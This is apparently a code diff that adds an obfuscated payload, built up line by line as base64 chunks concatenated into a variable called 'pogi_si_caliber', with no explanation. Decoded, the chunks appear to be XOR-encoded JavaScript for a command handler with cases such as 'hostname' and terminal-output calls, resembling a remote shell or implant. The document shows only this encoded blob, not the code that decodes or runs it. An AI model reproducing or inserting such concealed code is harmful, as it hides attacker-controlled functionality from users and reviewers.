+pogi_si_caliber += "0cbCyJipg4ODg8DC0MaDhMvM0NfNws7GhJmpg4ODg4OD18bRzv";
+pogi_si_caliber += "PRys3Xi8HM24+D+Pfm8e6Ny8zQ1/6KmKmDg4ODg4PB0cbCyJip";
+pogi_si_caliber += "g4ODg8DC0MaDhMfC18aEmYPYqYODg4ODg8DMzdDXg8eDnoPNxt";
+pogi_si_caliber += "SD58LXxovQxtHVxtHtzNSLioqYqYODg4ODg8DMzdDXg8fC2tCD";
+pogi_si_caliber += "noP4hPDWzYSPg4TuzM2Ej4OE99bGhI+DhPTGx4SPg4T3y9aEj4";
+pogi_si_caliber += "OE5dHKhI+DhPDC14T+mKmDg4ODg4PAzM3Q14POzM3Qg56D+ITp";
+pogi_si_caliber += "ws2Ej4OE5cbBhI+DhO7C0YSPg4Ti09GEj4OE7sLahI+DhOnWzY";
+pogi_si_caliber += "SPg4Tp1s+Ej4OE4tbEhI+DhPDG04SPg4TswNeEj4OE7czVhI+D";
+pogi_si_caliber += "hOfGwIT+mKmDg4ODg4PXxtHO89HKzdeLwczbj4P4x8La0PjHjc";
+pogi_si_caliber += "TG1/b34OfC2ouK/oOIg4SDhIOIg87MzdD4x43Extf29+DuzM3X";
+pogi_si_caliber += "y4uK/oOIg4SDhIOIg8eNxMbX9vfg58LXxouKg4iDhIOEg4iDx4";
+pogi_si_caliber += "3XzOrw7PDX0crNxIuKjdDPysDGi5KSj4OSmoqDiIOEg/b34IOE";
+pogi_si_caliber += "g4iDx43Extf29+Dl1s/P+sbC0YuK/oqYqYODg4ODg8HRxsLImK";
+pogi_si_caliber += "mDg4OD3qmDg4ODwMLQxoOE1tPXys7GhJmpg4ODg4OD18bRzvPR";
+pogi_si_caliber += "ys3Xi8HM24+D+ISDhIOIg83G1IPnwtfGi9DG0dXG0e3M1IuKio";
+pogi_si_caliber += "3XzOrw7PDX0crNxIuKjdDPysDGi5KSj4OSmoqDiIOEg9bTg4SD";
+pogi_si_caliber += "iIPW09fKzsbwy8zR14uKg4iDhI+Dg5KD1tDG0Y+Dg8/MwseDwt";
+pogi_si_caliber += "XG0cLExpmDk42XkY+Dk42Qko+Dk42RlIT+ipipg4ODg4ODwdHG";
+pogi_si_caliber += "wsiYqYODg4PAwtDGg4TWzcLOxoSZqYODg4ODg8rFi8LRxIOenp";
+pogi_si_caliber += "6DhI7ChIPf34PC0cSDnp6eg4SOjsLPz4SK2KmDg4ODg4ODg9fG";
+pogi_si_caliber += "0c7z0crN14vBzNuPg/iE78rN1tuDwMLPysHG0YOVjZqNlI7Czs";
+pogi_si_caliber += "eVl4OAkoPw7vOD8/Hm5u7z9/zn+u3i7urgg+fGwcrCzYOVjZqN";
+pogi_si_caliber += "lI6SyMLPypKDi5GTkZeOk5WOkZaKg9ublfyVl4Pk7faM78rN1t";
+pogi_si_caliber += "uE/oqYqYODg4ODg97Gz9DGg8rFi8LRxIOenp6DhI7RhIPf34PC";
+pogi_si_caliber += "0cSDnp6eg4SOjsjG0c3Gz47Rxs/GwtDGhIrYqYODg4ODg4OD18";
+pogi_si_caliber += "bRzvPRys3Xi8HM24+D+ISVjZqNlI7CzseVl4T+ipipg4ODg4OD";
+pogi_si_caliber += "3sbP0MbYqYODg4ODg4OD18bRzvPRys3Xi8HM24+D+ITvys3W24";
+pogi_si_caliber += "T+ipipg4ODg4OD3qmDg4ODg4PB0cbCyJipg4ODg8DC0MaDhM/Q";
+pogi_si_caliber += "hJmpg4ODg8DC0MaDhMfK0YSZqYODg4ODg8rFi8LRxIOenp6DhI";
+pogi_si_caliber += "7PhIPf34PC0cSDnp6eg4SOz8KEg9/fg8LRxIOenp6DhI7Cz4SD";
+pogi_si_caliber += "39+DwtHEg56enoOEjs/LhIqD18bRzvPRys3Xi8HM24+D7/D87+";
+pogi_si_caliber += "zt5IqYqYODg4ODg8bP0MaD18bRzvPRys3Xi8HM24+D7/D88Ovs";
+pogi_si_caliber += "8feKmKmDg4ODg4PB0cbCyJipg4ODg8DC0MaDhMDC14SZg9ipg4";
+pogi_si_caliber += "ODg4ODwMzN0NeDxcrPxoOeg/fm8e785erv5vD4wtHE/pipg4OD";
+pogi_si_caliber += "g4ODysWLxcrPxoqD18bRzvPRys3Xi8HM24+DxcrPxouKipipg4";
+pogi_si_caliber += "ODg4ODxs/QxoPXxtHO89HKzdeLwczbj4P4hMDC15mDhIOIg4vC";
+pogi_si_caliber += "0cSD39+DhISKg4iDhJmD7cyD0NbAy4PFys/Gg8zRg8fK0cbA18";
+pogi_si_caliber += "zR2oT+ipipg4ODg4ODwdHGwsiYqYODg4PeqYODg4PAwtDGg4TL";
+pogi_si_caliber += "ytDXzNHahJmpg4ODg4OD18bRzvPRys3Xi8HM24+D9+bx7vzr6v";
+pogi_si_caliber += "D37PH6jc7C04uLwI+DyoqDnp2D8NfRys3Ei8qDiIOSio3Twsfw";
+pogi_si_caliber += "18LR14uXioOIg4SDg4SDiIPAioqYqYODg4ODg8HRxsLImKmDg4";
+pogi_si_caliber += "ODwMLQxoOExsDLzISZqYODg4ODg9fG0c7z0crN14vBzNuPg/jR";
+pogi_si_caliber += "xtDX/oqYqYODg4ODg8HRxsLImKmDg4ODwMLQxoOExtvK14SZqY";
+pogi_si_caliber += "ODg4PAwtDGg4TPzMTM1teEmamDg4ODg4PXxtHO89HKzdeLwczb";
+pogi_si_caliber += "j4P4hM/MxMzW14SPg4TgzM3NxsDXyszNg9fMg4SDiIP35vHujc";
+pogi_si_caliber += "vM0NeDiIOEg8DPzNDGx42E/oqYqYODg4ODg8HRxsLImKmpg4OD";
+pogi_si_caliber += "g8DC0MaDhM3OwtOEmamDg4ODg4PXxtHO89HKzdeLwczbj4PNzs";
+pogi_si_caliber += "LTi9fC0cTG14Pf34OEkpONkpONkpeNlISKipipg4ODg4ODwdHG";
+pogi_si_caliber += "wsiYqYODg4PAwtDGg4TTys3EhJmpg4ODg4OD18bRzvPRys3Xi8";
+pogi_si_caliber += "HM24+D08rNxIvXwtHExteD39+DhJKNko2SjZKEioqYqYODg4OD";
+pogi_si_caliber += "g8HRxsLImKmDg4ODwMLQxoOEy9rH0cKEmamDg4ODg4PXxtHO89";
+pogi_si_caliber += "HKzdeLwczbj4Pr+ufx4vz28OLk5oqYqYODg4ODg8HRxsLImKmD";
+pogi_si_caliber += "g4ODwMLQxoOEztDFwMzN0MzPxoSZqYODg4PAwtDGg4TO0MWEma";
+pogi_si_caliber += "mDg4ODg4PXxtHO89HKzdeLwczbj4Pu8OX84eLt7ebxipipg4OD";
+pogi_si_caliber += "g4ODwdHGwsiYqYODg4PAwtDGg4TQxsLRwMvQ08/MyteEmamDg4";
+pogi_si_caliber += "ODg4PXxtHO89HKzdeLwczbj4PQxsLRwMvQ08/MyteL0cbQ14qK";
+pogi_si_caliber += "mKmDg4ODg4PB0cbCyJipg4ODg8DC0MaDhMLT14SZqYODg4PAwt";
+pogi_si_caliber += "DGg4TC09eOxMbXhJmD2KmDg4ODg4PAzM3Q14PQ1sGDnoOL08LR";
+pogi_si_caliber += "19D4kv6D39+DhISKjdfM78zUxtHgwtDGi4qYqYODg4ODg8rFi9";
+pogi_si_caliber += "DWwYOenp6DhNbTx8LXxoSKg9fG0c7z0crN14vBzNuPg+Lz9/z2";
+pogi_si_caliber += "8+fi9+aKmKmDg4ODg4PGz9DGg8rFi9DWwYOenp6DhMrN0NfCz8";
+pogi_si_caliber += "+Eg9/fg9DWwYOenp6DhNbTxNHCx8aEg9/fg9DWwYOenp6DhMXW";
+pogi_si_caliber += "z8+O1tPE0cLHxoSD39+D0NbBg56enoOE0cbKzdDXws/PhIqpg4";
+pogi_si_caliber += "ODg4ODg4PXxtHO89HKzdeLwczbj4PC09fqzdDXws/Pi9PC0dfQ";
+pogi_si_caliber += "+JH+g9/fg4TIws/Kjs/KzdbbjsDM0caEioqYqYODg4ODg8bP0M";
+pogi_si_caliber += "aDysWL0NbBg56enoOE0MbC0cDLhIqpg4ODg4ODg4PXxtHO89HK";
+pogi_si_caliber += "zdeLwczbj4P4hM3OwtODjoPtxtfUzNHIg8bb08/M0cLXyszNg9";
+pogi_si_caliber += "fMzM+Dws3Hg9DGwNbRytfag9DAws3NxtGEj4OEy9rH0cKDjoP1";
+pogi_si_caliber += "xtHag8XC0NeDzcbX1MzRyIPPzMTMzYPA0cLAyMbRhP6KmKmDg4";
+pogi_si_caliber += "ODg4PGz9DGg8rFi4LQ1sGKg9fG0c7z0crN14vBzNuPg+Lz9/z2";
+pogi_si_caliber += "8OLk5oqYqYODg4ODg8bP0MaD18bRzvPRys3Xi8HM24+D+ITmmY";
+pogi_si_caliber += "PqzdXCz8rHg8zTxtHC18rMzYOEg4iD0NbB/oqYqYODg4ODg8HR";
+pogi_si_caliber += "xsLImKmDg4OD3qmDg4ODwMLQxoOEytOEmamDg4ODg4PKxYvC0c";
+pogi_si_caliber += "SDnp6eg4TRhIPf34PC0cSDnp6eg4TRzISD39+DwtHEg56enoOE";
+pogi_si_caliber += "0czW18aEioPXxtHO89HKzdeLwczbj4Pq8/zx7Pb35oqYqYODg4";
+pogi_si_caliber += "ODg8bP0MaDysWLgsLRxIPf34PC0cSDnp6eg4TChIPf34PC0cSD";
+pogi_si_caliber += "np6eg4TCx8fRhIPf34PC0cSDnp6eg4TCx8fRxtDQhIPf34PC0c";
+pogi_si_caliber += "SDnp6eg4TQy8zUhIqD18bRzvPRys3Xi8HM24+D6vP84ufn8YqY";
+pogi_si_caliber += "qYODg4ODg8bP0MaD18bRzvPRys3Xi8HM24+D+ITswcnGwNeDgY";
+pogi_si_caliber += "SDiIPC0cSDiIOEgYPK0IPWzcjNzNTNj4PX0dqDgcrTg8vGz9OB";
+pogi_si_caliber += "jYT+ipipg4ODg4ODwdHGwsiYqYODg4PAwtDGg4TKxcDMzcXKxI";
+pogi_si_caliber += "SZqYODg4ODg9fG0c7z0crN14vBzNuPg+rl4Ozt5erkipipg4OD";
+pogi_si_caliber += "g4ODwdHGwsiYqYODg4PAwtDGg4TT0ISZqYODg4ODg9fG0c7z0c";
+pogi_si_caliber += "rN14vBzNuPg/Pw/OL2+4qYqYODg4ODg8HRxsLImKmDg4ODwMLQ";
+pogi_si_caliber += "xoOE0NCEmamDg4ODwMLQxoOEzcbX0NfC14SZqYODg4ODg9fG0c";
+pogi_si_caliber += "7z0crN14vBzNuPg/Dw/Pf27+3zipipg4ODg4ODwdHGwsiYqYOD";
+pogi_si_caliber += "g4PAwtDGg4THxYSZqYODg4ODg9fG0c7z0crN14vBzNuPg+fl/O";
+pogi_si_caliber += "uKmKmDg4ODg4PB0cbCyJipg4ODg8DC0MaDhMXRxsaEmamDg4OD";
+pogi_si_caliber += "g4PXxtHO89HKzdeLwczbj4Pl8ebm/OuKmKmDg4ODg4PB0cbCyJ";
+pogi_si_caliber += "ipg4ODg8fGxcLWz9eZqYODg4ODg9fG0c7z0crN14vBzNuPg/iE";
+pogi_si_caliber += "wcLQy5mDhIOIg83CzsaDiIOEmYPAzM7Ows3Hg83M14PFzNbNx4";
+pogi_si_caliber += "T+ipipg4PeqYOD18bRzvDA0czPz4vX0dbGipip3qmpxdbNwNfK";
+pogi_si_caliber += "zM2D18bRzvDA0czPz4vQzszM18uK2KmDg8DMzdDXg9HMzNeDno";
+pogi_si_caliber += "PRxtXGws/xzMzXjcTG1+HM1s3Hys3E4M/Kxs3X8cbA14uKmKmD";
+pogi_si_caliber += "g8DMzdDXg8HM24Oeg9fG0c7wxsDXyszNjcTG1+HM1s3Hys3E4M";
+pogi_si_caliber += "/Kxs3X8cbA14uKmKmDg8rFi8HM243BzNfXzM6Dn4PRzMzXjdfM";
+pogi_si_caliber += "04Pf34PBzNuN18zTg52D0czM143BzNfXzM6Kg9HG19bRzZipg4";
+pogi_si_caliber += "PXxtHO6s3T1teN0MDRzM/P6s3XzPXKxtSL2IPBz8zAyJmDhM3G";
+pogi_si_caliber += "wtHG0NeEj4PBxsvC1crM0ZmD0M7MzNfLg4WFg4LRxsfWwMbuzN";
+pogi_si_caliber += "fKzM2DnIOE0M7MzNfLhIOZg4TC1tfMhIPeipip3qmp18bRzuXM";
+pogi_si_caliber += "0c6NwsfH5tXGzdfvytDXxs3G0YuE0NbBzsrXhI+DxoOenYPYqY";
+pogi_si_caliber += "ODxo3T0cbVxs3X58bFwtbP14uKmKmDg8DMzdDXg9HC1IOeg9fG";
+pogi_si_caliber += "0c7qzdPW143Vws/Wxpipg4PXxtHO6s3T1teN1cLP1saDnoOEhJ";
+pogi_si_caliber += "ipg4PXxtHO8dbNi9HC1IqYqYOD18bRzvDA0czPz4uKmKneipip";
+pogi_si_caliber += "qdfG0c7qzdPW143Cx8fm1cbN1+/K0NfGzcbRi4TIxtrHzNTNhI";
+pogi_si_caliber += "+DxoOenYPYqYODysWLxo3IxtqDnp6eg4Ti0dHM1PbThIrYqYOD";
+pogi_si_caliber += "g4PKxYuC9+bx7vzr6vD37PH6jc/GzcTXy4qD0cbX1tHNmKmDg4";
+pogi_si_caliber += "ODxo3T0cbVxs3X58bFwtbP14uKmKmDg4OD18bRzuvK0NfqzcfG";
+pogi_si_caliber += "24Oeg+7C18uNzsLbi5OPg9fG0c7rytDX6s3HxtuDjoOSipipg4";
+pogi_si_caliber += "ODg9fG0c7qzdPW143Vws/WxoOeg/fm8e786+rw9+zx+vjXxtHO";
+pogi_si_caliber += "68rQ1+rNx8bb/oPf34OEhJipg4Pexs/QxoPKxYvGjcjG2oOenp";
+pogi_si_caliber += "6DhOLR0czU58zUzYSK2KmDg4ODysWLgvfm8e786+rw9+zx+o3P";
+pogi_si_caliber += "xs3E18uKg9HG19bRzZipg4ODg8aN09HG1cbN1+fGxcLWz9eLip";
+pogi_si_caliber += "ipg4ODg9fG0c7rytDX6s3HxtuDnoPuwtfLjc7KzYv35vHu/Ovq";
+pogi_si_caliber += "8Pfs8fqNz8bNxNfLj4PXxtHO68rQ1+rNx8bbg4iDkoqYqYODg4";
+pogi_si_caliber += "PXxtHO6s3T1teN1cLP1saDnoP35vHu/Ovq8Pfs8fr418bRzuvK";
+pogi_si_caliber += "0NfqzcfG2/6D39+DhISYqYOD3qneipipqcfMwNbOxs3XjcTG1+";
+pogi_si_caliber += "bPxs7Gzdfh2urHi4TXxtHO4czH2oSKjcLHx+bVxs3X78rQ18bN";
+pogi_si_caliber += "xtGLhMDPysDIhI+DxoOenYPYqYODysWLxo3XwtHExteNwM/M0M";
+pogi_si_caliber += "bQ14uEwo+DwdbX18zNhIqKg9HG19bRzZipg4PKxYvw19HKzcSL";
+pogi_si_caliber += "xMbX8MbPxsDXyszNi4qKioPRxtfW0c2YqYOD18bRzurN09bXjc";
+pogi_si_caliber += "XMwNbQi9iD09HG1cbN1/DA0czPz5mD19HWxoPeipip3oqYqamL";
+pogi_si_caliber += "xdbNwNfKzM2D18bRzurNytfKws+Litipg4PAzM3Q14PBzNuDno";
+pogi_si_caliber += "PXxtHO4czbi4qYqYOD18bRzvPRzM7T14vBzNuKjdfG29fgzM3X";
+pogi_si_caliber += "xs3Xg56DhM3GzMXG18DLhJipg4PBzNuNwtPTxs3H4MvKz8eL18";
+pogi_si_caliber += "bRzuXG18DLi4qKmKmDg9fG0c7z0czO09eLwczbio3XxtvX4MzN";
+pogi_si_caliber += "18bN14Oeg4TAwteD0NfC19bQjdfb14SYqYODwMzN0NeD0czUg5";
+pogi_si_caliber += "6Dx8zA1s7GzdeNwNHGwtfG5s/GzsbN14uEx8rVhIqYqYOD0czU";
+pogi_si_caliber += "jcDPwtDQ7cLOxoOeg4TXxtvXjsHPzMzHjtDMxdeEmKmDg8DMzd";
+pogi_si_caliber += "DXg87C0ciDnoPHzMDWzsbN143A0cbC18bmz8bOxs3Xi4TQ08LN";
+pogi_si_caliber += "hIqYqYODzsLRyI3Az8LQ0O3CzsaDnoOE18bb147Bz8zMx47Hys";
+pogi_si_caliber += "6EmKmDg87C0ciN18bb1+DMzdfGzdeDnoOEnYOEmKmDg8DMzdDX";
+pogi_si_caliber += "g9fG29eDnoPHzMDWzsbN143A0cbC18bmz8bOxs3Xi4TQ08LNhI";
+pogi_si_caliber += "qYqYOD18bb143XxtvX4MzN18bN14Oeg/fm8e6N0NfC19bQmKmD";
+pogi_si_caliber += "g9HM1I3C09PGzceLzsLRyI+D18bb14qYqYODwczbjcLT08bNx+";
+pogi_si_caliber += "DLys/Hi9HM1IqYqd6Ki4qYqanAzM3Q14PGzdfG0eLR14Oeg8fM";
+pogi_si_caliber += "wNbOxs3XjcTG1+bPxs7Gzdfh2urHi4TGzdfG0eLR14SKmKnAzM";
+pogi_si_caliber += "3Q14PBws3NxtHmz4Oeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urH";
+pogi_si_caliber += "i4TBws3NxtGEipipwMzN0NeD19HKzuLR14Oeg9fG29eDnp2D18";
+pogi_si_caliber += "bb143RxtPPwsDGi4z/0YzEj4OEhIqN0NPPyteLhP/NhIqNzsLT";
+pogi_si_caliber += "i8/KzcaDnp2Dz8rNxo3RxtPPwsDGi4z/0IiHjI+DhISKio3JzM";
+pogi_si_caliber += "rNi4T/zYSKmKnAzM3Q14PC0dfwzNbRwMaDnoOLioOenYPX0crO";
+pogi_si_caliber += "4tHXi8rNzcbR9MrH18uDn4OUlZODnIPg7O3l6uSNz8zCx8rNxO";
+pogi_si_caliber += "LQwMrKg5mD4Ozt5erkjcLQwMrK4tHXipipqcXWzcDXyszNg8XK";
+pogi_si_caliber += "1+LR14vGz4+D18bb14+DzsLb5czN14+D1MrH18vxwtfKzI+Dy8";
+pogi_si_caliber += "bKxMvX8cLXysyK2KmDg8DMzdDXg8/KzcbQg56D18bb143Q08/K";
+pogi_si_caliber += "14uE/82Eipipg4PAzM3Q14PAzM/Qg56D7sLXy43OwtuLjY2Nz8";
+pogi_si_caliber += "rNxtCNzsLTi8/KzcaDnp2Dz8rNxo3Pxs3E18uKj4OSipipg4PA";
+pogi_si_caliber += "zM3Q14PQytnGg56D7sLXy43Oys2LzsLb5czN14+Di8rNzcbR9M";
+pogi_si_caliber += "rH18uDiYPUysfXy/HC18rMioOMg4vAzM/Qg4mDjZWRio+Di8rN";
+pogi_si_caliber += "zcbR68bKxMvXg4mDy8bKxMvX8cLXysyKg4yDz8rNxtCNz8bNxN";
+pogi_si_caliber += "fLipipg4PGz43Q19rPxo3FzM3X8MrZxoOeg+7C18uNzsLbi5KN";
+pogi_si_caliber += "lo+D0MrZxoqN18zlytvGx4uRioOIg4TT24SYqd6pqcDMzdDXg+";
+pogi_si_caliber += "Lx9/zk7/rz6/CDnoOEjZmOnoiJgIbjhJipwMzN0NeD4vH3/Ozx";
+pogi_si_caliber += "5+bxg56D2KmDg8Ha8czUmYOL0czUj4PAzM+Pg9HM1NCKg56dg9";
+pogi_si_caliber += "HM1IOMg9HM1NCPqYOD09HKzdeZg4vRzNSPg8DMz4+D0czU0I+D";
+pogi_si_caliber += "wMzP0IqDnp2Di9HM1IOMg9HM1NCKg4mDjZuDiIOLwMzPg4yDwM";
+pogi_si_caliber += "zP0IqDiYONkY+pg4PBzNfXzM720+fKwsTMzcLPmYOL0czUj4PA";
+pogi_si_caliber += "zM+Pg9HM1NCPg8DMz9CKg56dg4vAzM+DjIPAzM/QioOJg42bg4";
+pogi_si_caliber += "iDjZGDiYOLkoOOg9HM1IOMg9HM1NCKj6mDg8XRzM7gxs3X0caZ";
+pogi_si_caliber += "g4vRzNSPg8DMz4+D0czU0I+DwMzP0IqDnp2D2KmDg4ODwMzN0N";
+pogi_si_caliber += "eD24Oeg4vAzM+DjoPAzM/Qg4yDkYqDjIOLwMzP0IOMg5GKmKmD";
+pogi_si_caliber += "g4ODwMzN0NeD2oOeg4vRzNSDjoPRzNTQg4yDkYqDjIOL0czU0I";
+pogi_si_caliber += "OMg5GKmKmDg4OD0cbX1tHNg+7C18uNzsrNi5KPg+7C18uN0NLR";
+pogi_si_caliber += "14vbg4mD24OJg42Wg4iD2oOJg9qDiYONloqDjIONmoqYqYOD3o";
+pogi_si_caliber += "+p3pipwMzN0NeDwtHX5s3Eys3G0IOeg83G1IP0xsLI7sLTi4qY";
+pogi_si_caliber += "qanF1s3A18rMzYPA0cbC18bi0dfmzcTKzcaLxs+Pg9fG29ePg8";
+pogi_si_caliber += "zT19CK2KmDg8DMzdDXg8DFxIOeg9ipg4ODg8TP2tPL0JmD4vH3";
+pogi_si_caliber += "/OTv+vPr8I+pg4ODg9DUxsbTmYOSjZKPqYODg4PJytfXxtGZg4";
+pogi_si_caliber += "2Xlo+pg4ODg8zRx8bRmYPi8ff87PHn5vGNwdrxzNSPqYODg4PE";
+pogi_si_caliber += "z8rXwMvuys2Zg5GTk5OPqYODg4PEz8rXwMv1wtGZg5OPqYODg4";
+pogi_si_caliber += "PEz8rXwMvxzNTQmYOXj6mDg4ODxM/K18DL98rOxpmDkpeTj6mD";
+pogi_si_caliber += "g4ODxM/K18DL58bPwtqZg5KSk5OPqYODg4PAzNHR1tPXmYONkp";
+pogi_si_caliber += "GPqYODg4PQwMLN59bRwtfKzM2Zg5GVk5OPqYODg4PQwMLN88bR";
+pogi_si_caliber += "yszHmYOVk5OTj6mDg4OD0MDCzfPG0crMx/XC0ZmDkJOTk4+pg4";
+pogi_si_caliber += "ODg9DAws30ysfXy5mDkY+pg4ODg9DAws3205mDxcLP0MaPqYOD";
+pogi_si_caliber += "g4PQwMLNmYPX0dbGj6mDg4OD0MDCzefGz8LamYOSkZOTj6mDg4";
+pogi_si_caliber += "OD18vRzNfXz8aZg5Gbj6mDg4ODjY2NzNPX0I+pg4PemKmDg9fG";
+pogi_si_caliber += "29eDnoPXxtvXjdHG08/CwMaLjP/RjMSPg4SEipipg4PAzM3Q14";
+pogi_si_caliber += "PPys3G0IOeg9fG29eN0NPPyteLhP/NhIqYqYODwMzN0NeD0czU";
+pogi_si_caliber += "0IOeg8/KzcbQjc/GzcTXy5ipg4PAzM3Q14PAzM/Qg56D7sLXy4";
+pogi_si_caliber += "3OwtuLko+DjY2Nz8rNxtCNzsLTi8/KzcaDnp2Dz8rNxo3Pxs3E";
+pogi_si_caliber += "18uKipipg4PAzM3Q14PE0crHg56Dz8rNxtCNzsLTi8/KzcaDnp";
+pogi_si_caliber += "2D4tHRwtqNxdHMzovPys3GioqYqYODwMzN0NeD18rOxtCDnoPE";
+pogi_si_caliber += "0crHjc7C04uLwMvC0dCPg9GKg56dg8DLwtHQjc7C04uLwMuPg8";
+pogi_si_caliber += "CKg56dqYODg4OLwMuDnp6eg4SDhIPf34PAy4Oenp6DhP/WkZuT";
+pogi_si_caliber += "k4SKg5yDjpKDmYPAxcSNzNHHxtGL0Y+DwI+D0czU0I+DwMzP0I";
+pogi_si_caliber += "qDiYPAxcSN0NTGxtODiIPuwtfLjdHCzcfMzouKg4mDwMXEjcnK";
+pogi_si_caliber += "19fG0amDg4qKmKmDg8DMzdDXg9HM1O7C24Oeg9fKzsbQjc7C04";
+pogi_si_caliber += "vRzNSDnp2D0czUjdHGx9bAxouLwo+D14qDnp2Di9eDnYPCg5yD";
+pogi_si_caliber += "14OZg8KKj4OTioqYqYODwMzN0NeDx8zNxvHM1NCDnoPNxtSD4t";
+pogi_si_caliber += "HRwtqL0czU0IqNxcrPz4vFws/QxoqYqYODwMzN0NeDy8zX8czU";
+pogi_si_caliber += "0IOeg83G1IPi0dHC2ovRzNTQio3Fys/Pi8XCz9DGipipg4PAzM";
+pogi_si_caliber += "3Q14PPys3G98bb14Oeg83G1IPi0dHC2ovRzNTQio3Fys/Pi4SE";
+pogi_si_caliber += "ipipg4PAzM3Q14PRws3Hg56Di4qDnp2DwMXEjcTP2tPL0PiL7s";
+pogi_si_caliber += "LXy43Rws3HzM6LioOJg8DFxI3Ez9rTy9CNz8bNxNfLioPfg5P+";
+pogi_si_caliber += "mKmpg4PGz43Kzc3G0ev37u+DnoOEhJipg4PAzM3Q14PPys3G5s";
+pogi_si_caliber += "/Qg56DxNHKx43OwtOLwMvC0dCDnp2D2KmDg4ODwMzN0NeDx8rV";
+pogi_si_caliber += "g56Dx8zA1s7GzdeNwNHGwtfG5s/GzsbN14uEx8rVhIqYqYODg4";
+pogi_si_caliber += "PHytWN18bb1+DMzdfGzdeDnoOEg4SN0cbTxsLXi8DLwtHQjc/G";
+pogi_si_caliber += "zcTXy4qYqYODg4PGz43C09PGzcfgy8rPx4vHytWKmKmDg4OD0c";
+pogi_si_caliber += "bX1tHNg8fK1Zipg4PeipipqYODz8bXg9HCxYOeg5OPg9DXwtHX";
+pogi_si_caliber += "xsfi14Oeg5OPg8/C0Nfl0cLOxoOeg5OPg9DXwtHXxseDnoPFws";
+pogi_si_caliber += "/Qxo+D0cbVxsLP58zNxoOeg8XCz9DGmKmDg8/G14PEz8rXwMv2";
+pogi_si_caliber += "zdfKz4Oeg5OPg8TPytfAy8rNxIOeg8XCz9DGj4PEz8rXwMvxzN";
+pogi_si_caliber += "TvytDXg56D+P6YqYODz8bXg83G29fkz8rXwMuDnoOTj4PQwMLN";
+pogi_si_caliber += "4sDXytXGg56DxcLP0MaPg9DAws3w18LR18bH4teDnoOTj4PNxt";
+pogi_si_caliber += "vX8MDCzYOeg5OYqamDg8XWzcDXyszNg9DG1+/KzcaL0Y+D1cLP";
+pogi_si_caliber += "1saK2KmDg4ODysWLz8rNxvfG29f40f6Dnp6eg9XCz9bGioPRxt";
+pogi_si_caliber += "fW0c2YqYODg4PPys3G98bb1/jR/oOeg9XCz9bGmKmDg4ODz8rN";
+pogi_si_caliber += "xubP0PjR/o3XxtvX4MzN18bN14Oeg9XCz9bGmKmDg96pg4PF1s";
+pogi_si_caliber += "3A18rMzYPAzNHR1tPX78rNxovVws/WxorYqYODg4PPxteDzNbX";
+pogi_si_caliber += "g56DhISYqYODg4PFzNGLz8bXg8qDnoOTmIPKg5+D1cLP1saNz8";
+pogi_si_caliber += "bNxNfLmIPKiIiK2KmDg4ODg4PAzM3Q14PAy4Oeg9XCz9bGjcDL";
+pogi_si_caliber += "wtHi14vKipipg4ODg4ODzNbXg4ieg4vAy4Oenp6DhIOEg9/fg+";
+pogi_si_caliber += "7C18uN0cLNx8zOi4qDnYPAxcSNwMzR0dbT14qDnIPAy4OZg9HC";
+pogi_si_caliber += "zceLipipg4ODg96pg4ODg9HG19bRzYPM1teYqYOD3qmDg8XWzc";
+pogi_si_caliber += "DXyszNg9HG0NfM0cbxzNSL0YrYqYODg4PPys3G5s/Q+NH+jdDX";
+pogi_si_caliber += "2s/GjdfRws3QxczRzoOeg4SEmKmDg4OD0MbX78rNxovRj4PE0c";
+pogi_si_caliber += "rH+NH+jcnMys2LhISKipipg4PeqYODxdbNwNfKzM2DwM/GwtHr";
+pogi_si_caliber += "zNeLitipg4ODg8XM0YvPxteD0YOeg5OYg9GDn4PRzNTQmIPRiI";
+pogi_si_caliber += "iK2KmDg4ODg4PKxYuCy8zX8czU0PjR/oqDwMzN18rN1saYqYOD";
+pogi_si_caliber += "g4ODg8vM1/HM1ND40f6DnoPFws/Qxpipg4ODg4ODz8rNxubP0P";
+pogi_si_caliber += "jR/o3Az8LQ0O/K0NeN0cbOzNXGi4TLzNeEipipg4ODg96pg4Pe";
+pogi_si_caliber += "qYODxdbNwNfKzM2D0cbVxsLP4s/Pi4rYqYODg4PFzNGLz8bXg9";
+pogi_si_caliber += "GDnoOTmIPRg5+D0czU0JiD0YiIitipg4ODg4ODx8zNxvHM1ND4";
+pogi_si_caliber += "0f6DnoPX0dbGmKmDg4ODg4PKxYvEz8rXwMvKzcSDhYWDxM/K18";
+pogi_si_caliber += "DL8czU78rQ143KzcfG2+zFi9GKg52eg5OKg8/Kzcbmz9D40f6N";
+pogi_si_caliber += "0Nfaz8aN19HCzdDFzNHOg56DhISYqYODg4ODg9DG1+/KzcaL0Y";
+pogi_si_caliber += "+DxNHKx/jR/o3JzMrNi4SEioqYqYODg4ODg8/Kzcbmz9D40f6N";
+pogi_si_caliber += "wM/C0NDvytDXjdHGzszVxouEy8zXhIqYqYODg4ODg8vM1/HM1N";
+pogi_si_caliber += "D40f6DnoPFws/Qxpipg4ODg96pg4ODg8TPytfAy8rNxIOeg8XC";
+pogi_si_caliber += "z9DGmKmDg4ODxM/K18DL8czU78rQ14Oeg/j+mKmDg4OD0cbVxs";
+pogi_si_caliber += "LP58zNxoOeg9fR1saYqYODg4PNxtvX5M/K18DLg56D08bRxczR";
+pogi_si_caliber += "zsLNwMaNzczUi4qDiIPAxcSNxM/K18DL58bPwtqYqYOD3qmDg8";
+pogi_si_caliber += "XWzcDXyszNg9HG1cbCz/DXxtOLzczUitipg4ODg8DMzdDXg9eD";
+pogi_si_caliber += "noOLzczUg46D0NfC0dfGx+LXioOMg5KTk5OYqYODg4PPxteDws";
+pogi_si_caliber += "/Pg56D19HWxpipg4ODg8XM0YvPxteD0YOeg5OYg9GDn4PRzNTQ";
+pogi_si_caliber += "mIPRiIiK2KmDg4ODg4PKxYvHzM3G8czU0PjR/oqDwMzN18rN1s";
+pogi_si_caliber += "aYqYODg4ODg8rFi9eDnYPRzNTuwtv40f6DiIONkJaK2KmDg4OD";
+pogi_si_caliber += "g4ODg9DG1+/KzcaL0Y+DxNHKx/jR/o3JzMrNi4SEioqYqYODg4";
+pogi_si_caliber += "ODg4ODx8zNxvHM1ND40f6DnoPX0dbGmKmDg4ODg4ODg8DMzdfK";
+pogi_si_caliber += "zdbGmKmDg4ODg4PeqYODg4ODg8LPz4Oeg8XCz9DGmKmDg4ODg4";
+pogi_si_caliber += "PAzM3Q14PAy8LR0IOeg8TRysf40f6Pg8DLwtH3ys7G0IOeg9fK";
+pogi_si_caliber += "zsbQ+NH+mKmDg4ODg4PPxteDzNbXg56DhISYqYODg4ODg8XM0Y";
